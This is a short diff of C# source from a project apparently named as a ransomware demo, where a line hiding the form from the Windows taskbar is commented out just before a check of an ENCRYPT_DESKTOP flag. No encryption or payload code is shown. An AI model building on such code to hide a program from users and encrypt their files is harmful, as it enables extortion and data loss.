@@ -41,7 +41,7 @@ namespace RanWare_Demomot
 
         private void Form1_Load(object sender, EventArgs e)
         {
-            this.ShowInTaskbar = false;//Pas d'îcone dans la barre des tâches
+            //this.ShowInTaskbar = false;//Pas d'îcone dans la barre des tâches
 
             if (ENCRYPT_DESKTOP)
             {
